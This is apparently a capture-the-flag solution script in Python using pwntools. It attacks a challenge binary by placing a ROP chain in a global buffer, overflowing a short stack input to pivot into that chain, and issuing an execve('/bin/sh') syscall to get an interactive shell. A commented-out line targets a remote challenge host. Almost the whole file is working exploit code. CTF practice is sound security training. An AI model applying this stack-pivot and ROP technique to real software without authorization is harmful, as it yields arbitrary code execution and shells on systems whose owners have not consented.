#!/usr/bin/env python3
#2 fgets are used to take user input ..One goes to the global array
#The other goes to the stack..
# The second input is so short that we can overwrite only the return address
# So the idea is to create a ropchain in the first input in global array make a stack pivot
#The function gadgets have multiple gadgets which allows us to control rax,rdi,rsi,rdx,rbp 
#And also a syscall gadget too
#The whole exploit plan is to make a stack pivot then make a execve /bin/sh syscall


from pwn import *


e = ELF("./chall")
r = process("./chall")
#r = remote("gc1.eng.run",31517)
exploit = b"/bin/sh\x00"  + p64(e.sym["gadgets"] + 8) + p64(0x3b) + p64(e.sym["gadgets"]+10) + p64(e.sym["buffer"]) + p64(e.sym["gadgets"] + 12) + p64(0) + p64(e.sym["gadgets"] + 14) + p64(0) + p64(e.sym["gadgets"] + 16)
r.sendline(exploit)
exploit = b"A" * 32 + p64(e.sym["buffer"]) + p64(0x4012a8)
r.sendline(exploit)
r.interactive()